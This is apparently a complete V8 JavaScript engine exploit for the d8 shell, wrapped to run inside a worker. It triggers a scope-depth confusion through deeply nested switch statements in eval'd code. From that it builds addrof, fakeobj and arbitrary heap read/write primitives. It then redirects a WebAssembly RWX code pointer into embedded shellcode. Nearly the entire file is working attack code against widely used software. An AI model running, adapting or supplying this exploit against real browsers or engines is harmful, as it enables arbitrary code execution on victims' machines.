// Run with:
//   ./out/x64.release_no_inline/d8 exp_nopatch_worker.js
//
// Single-file worker wrapper for exp_nopatch.js. The exploit body must remain
// top-level inside the worker script, so it is embedded verbatim in a block
// comment and extracted at runtime.

function workerMain() { /*
// Run with:
//   ./out/x64.release_no_inline/d8 --stack-size=128 exp_nopatch.js
// Optional:
//   ./out/x64.release_no_inline/d8 --stack-size=128 --allow-natives-syntax exp_nopatch.js

function i2f(i) {
  const ab = new ArrayBuffer(8);
  const dv = new DataView(ab);
  dv.setBigUint64(0, i, true);
  return dv.getFloat64(0, true);
}

function f2i(f) {
  const ab = new ArrayBuffer(8);
  const dv = new DataView(ab);
  dv.setFloat64(0, f, true);
  return dv.getBigUint64(0, true);
}

function smi(x) {
  return BigInt(x) << 1n;
}

function pack32(lo, hi) {
  return (BigInt(hi >>> 0) << 32n) | BigInt(lo >>> 0);
}

function low32(x) {
  return Number(x & 0xffffffffn) >>> 0;
}

function hex64(i) {
  return "0x" + i.toString(16).padStart(16, 0);
}

function makeDeepSwitchScopeChain(depth) {
  let s = "0;";
  for (let i = 0; i < depth; i++) {
    s = `switch (1) { case 0: let x; ${s} }`;
  }
  return s;
}

const kNoPatchSwitchDepth = 3000;
const kNoPatchDeep = makeDeepSwitchScopeChain(kNoPatchSwitchDepth);

const c1 = 1; const c2 = 2; const c3 = 3; const c4 = 4; const c5 = 5;
const c6 = 6; const c7 = 7; const c8 = 8; const c9 = 9; const c10 = 10;
const c11 = 11; const c12 = 12; const c13 = 13; const c14 = 14; const c15 = 15;
const c16 = 16; const c17 = 17; const c18 = 18; const c19 = 19; const c20 = 20;
const c21 = 21; const c22 = 22; const c23 = 23; const c24 = 24; const c25 = 25;

let v1 = 1; let v2 = 2; let v3 = 3; let v4 = 4; let v5 = 5;
let v6 = 6; let v7 = 7; let v8 = 8; let v9 = 9; let v10 = 10;
let v11 = 11; let v12 = 12; let v13 = 13; let v14 = 14; let v15 = 15;
let v16 = 16; let v17 = 17; let v18 = 18; let v19 = 19; let v20 = 20;
let v21 = 21; let v22 = 22; let v23 = 23; let v24 = 24; let v25 = 25;
let v26 = 26; let v27 = 27; let v28 = 28; let v29 = 29; let v30 = 30;
let v31 = 31; let v32 = 32; let v33 = 33; let v34 = 34; let v35 = 35;
let v36 = 36; let v37 = 37; let v38 = 38; let v39 = 39; let v40 = 40;
let v41 = 41; let v42 = 42; let v43 = 43; let v44 = 44; let v45 = 45;
let v46 = 46; let v47 = 47; let v48 = 48; let v49 = 49; let v50 = 50;
let v51 = 51; let v52 = 52; let v53 = 53; let v54 = 54; let v55 = 55;
let v56 = 56; let v57 = 57; let v58 = 58; let v59 = 59; let v60 = 60;
let v61 = 61; let v62 = 62; let v63 = 63; let v64 = 64; let v65 = 65;
let v66 = 66; let v67 = 67; let v68 = 68; let v69 = 69; let v70 = 70;
let v71 = 71; let v72 = 72; let v73 = 73; let v74 = 74; let v75 = 75;
let v76 = 76; let v77 = 77; let v78 = 78; let v79 = 79; let v80 = 80;
let v81 = 81; let v82 = 82; let v83 = 83; let v84 = 84; let v85 = 85;
let v86 = 86; let v87 = 87; let v88 = 88; let v89 = 89; let v90 = 90;
let v91 = 91; let v92 = 92; let v93 = 93; let v94 = 94; let v95 = 95;
let v96 = 96; let v97 = 97; let v98 = 98; let v99 = 99; let v100 = 100;
let v101 = 101; let v102 = 102; let v103 = 103; let v104 = 104; let v105 = 105;
let v106 = 106; let v107 = 107; let v108 = 108; let v109 = 109; let v110 = 110;
let v111 = 111; let v112 = 112; let v113 = 113; let v114 = 114; let v115 = 115;
let v116 = 116; let v117 = 117; let v118 = 118; let v119 = 119; let v120 = 120;
let v121 = 121; let v122 = 122; let v123 = 123; let v124 = 124; let v125 = 125;
let v126 = 126; let v127 = 127; let v128 = 128; let v129 = 129; let v130 = 130;

let optimizeAndCall = null;
try {
  optimizeAndCall = new Function(
      "fn",
      "%PrepareFunctionForOptimization(fn);" +
      "%OptimizeFunctionOnNextCall(fn);" +
      "return fn();");
} catch (_) {
}

function warmupLeak(fn, expected) {
  if (optimizeAndCall !== null) return optimizeAndCall(fn);

  for (let round = 0; round < 64; round++) {
    for (let i = 0; i < 20000; i++) fn();
    const value = fn();
    if (typeof value !== "number" || value !== expected) return value;
  }
  throw new Error("failed to tier up leak primitive");
}

globalThis.kPackedElementsMap = 0x0100d15d;
globalThis.kPackedDoubleMap = 0x0100d0d5;

// This file has 25 top-level const bindings before the vN series, so the
// wrong-depth slot that lands on native slot 123/125 is v98/v100 here.
// The carrier has to be installed from top-level eval; wrapping eval in a
// helper function changes the writer back into a script-cell store.
eval(`
let f;
switch (0) {
  case 0:
    0;
    try { throw 0; } catch (y) {
      if (1) {
        f = function() { return v98; };
      } else {
        ${kNoPatchDeep}
      }
    }
    globalThis.leak126 = f;
}
`);

eval(`
let f;
switch (0) {
  case 0:
    0;
    try { throw 0; } catch (y) {
      if (1) {
        f = function() { return v100; };
      } else {
        ${kNoPatchDeep}
      }
    }
    globalThis.leak128 = f;
}
`);

globalThis.map126 = warmupLeak(leak126, 98);
globalThis.map128 = warmupLeak(leak128, 100);
if (typeof map126 === "number" || typeof map128 === "number") {
  throw new Error("carrier did not produce native-context maps");
}

eval(`
let f;
switch (0) {
  case 0:
    0;
    try { throw 0; } catch (y) {
      if (1) {
        f = function() { v98 = globalThis.payload; return 0; };
      } else {
        ${kNoPatchDeep}
      }
    }
    globalThis.write126 = f;
}
`);

eval(`
let f;
switch (0) {
  case 0:
    0;
    try { throw 0; } catch (y) {
      if (1) {
        f = function() { v100 = globalThis.payload; return 0; };
      } else {
        ${kNoPatchDeep}
      }
    }
    globalThis.write128 = f;
}
`);

function addrof(obj) {
  const helperMap = new Map([[obj, 0x1337]]);
  payload = map128;
  write126();
  const pair = helperMap.entries().next().value;
  payload = map126;
  write126();
  return f2i(pair[0]);
}

function fakeobj(addr) {
  const raw = [1.1, i2f(addr)];
  payload = map126;
  write128();
  const out = raw.toReversed();
  payload = map128;
  write128();
  return out[0];
}

// Reserve a stable pre-Wasm holder before later allocations start landing on
// NaN-prone addresses for addrof().
const wasmHolder = {x: null, i: 0x1337};
const wasmHolderAddr = addrof(wasmHolder);

const driver = [1.1, 2.2, 3.3, 4.4];
const driverAddr = addrof(driver);
const fake = fakeobj(driverAddr - 0x20n);

function setFakeDoubleTarget(rawAddrLow32) {
  driver[0] = i2f(pack32(globalThis.kPackedDoubleMap, 0));
  driver[1] = i2f(pack32((rawAddrLow32 - 7) >>> 0, Number(smi(1) & 0xffffffffn)));
}

function heapRead64(taggedAddr, off = 0) {
  const raw = ((low32(taggedAddr) - 1 + off) >>> 0);
  setFakeDoubleTarget(raw);
  return f2i(fake[0]);
}

function heapWrite64(taggedAddr, off, val) {
  const raw = ((low32(taggedAddr) - 1 + off) >>> 0);
  setFakeDoubleTarget(raw);
  fake[0] = i2f(val);
}

const rawAB = new ArrayBuffer(0x1000);
const rawABAddr = addrof(rawAB);
const rawABOrigLen = heapRead64(rawABAddr, 20);
const rawABOrigMax = heapRead64(rawABAddr, 28);
const rawABOrigBs = heapRead64(rawABAddr, 36);

function withRawView(ptr, size, fn) {
  heapWrite64(rawABAddr, 20, BigInt(size));
  heapWrite64(rawABAddr, 28, BigInt(size));
  heapWrite64(rawABAddr, 36, ptr);
  const dv = new DataView(rawAB);
  try {
    return fn(dv);
  } finally {
    heapWrite64(rawABAddr, 36, rawABOrigBs);
    heapWrite64(rawABAddr, 20, rawABOrigLen);
    heapWrite64(rawABAddr, 28, rawABOrigMax);
  }
}

function rawRead64(ptr) {
  return withRawView(ptr, 8, dv => dv.getBigUint64(0, true));
}

var wasm_code = new Uint8Array([
  0, 97, 115, 109, 1, 0, 0, 0, 1, 4, 1, 96, 0, 0, 3, 3, 2, 0, 0, 5, 3, 1, 0, 1,
  7, 19, 2, 7, 116, 114, 105, 103, 103, 101, 114, 0, 0, 5, 115, 104, 101, 108,
  108, 0, 1, 10, 99, 2, 3, 0, 1, 11, 93, 0, 65, 0, 66, 212, 188, 197, 249, 143,
  146, 228, 245, 9, 55, 3, 0, 65, 8, 66, 186, 161, 128, 128, 128, 128, 228,
  245, 6, 55, 3, 0, 65, 16, 66, 177, 128, 191, 168, 128, 146, 228, 245, 6, 55,
  3, 0, 65, 24, 66, 184, 247, 128, 128, 128, 128, 228, 245, 6, 55, 3, 0, 65, 32,
  66, 212, 190, 197, 177, 159, 198, 244, 245, 6, 55, 3, 0, 65, 40, 66, 143, 138,
  172, 247, 143, 146, 164, 200, 144, 127, 55, 3, 0, 11,
]);

var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var shell = wasm_instance.exports.shell;
var trigger = wasm_instance.exports.trigger;

shell();

// Direct addrof(wasm_instance) can collapse to NaN under the no-patch path.
// Reuse the pre-allocated holder and read its in-object `x` field back.
wasmHolder.x = wasm_instance;
const holderFields = heapRead64(wasmHolderAddr, 8);
const instAddr = (holderFields >> 32n) & 0xffffffffn;
console.log(hex64(instAddr));

const trustedData = heapRead64(instAddr, 12) & 0xffffffffn;
console.log(hex64(trustedData));

const rwxAddrSlot = trustedData + 8n * 5n;
const rwxLeak = heapRead64(rwxAddrSlot);
console.log(hex64(rwxAddrSlot));
console.log(hex64(rwxLeak));
heapWrite64(rwxAddrSlot, 0, rwxLeak + 0xa1en);
console.log(hex64(rwxLeak + 0xa1en));
trigger();

postMessage("done");
close();
*/ }

function extractWorkerSource(fn) {
  const source = Function.prototype.toString.call(fn);
  const start = source.indexOf("/*");
  const end = source.lastIndexOf("*/");
  if (start === -1 || end === -1 || end <= start + 2) {
    throw new Error("failed to extract worker source");
  }
  return source.slice(start + 2, end);
}

const worker = new Worker(extractWorkerSource(workerMain), {type: "string"});
worker.onmessage = message => print(message);
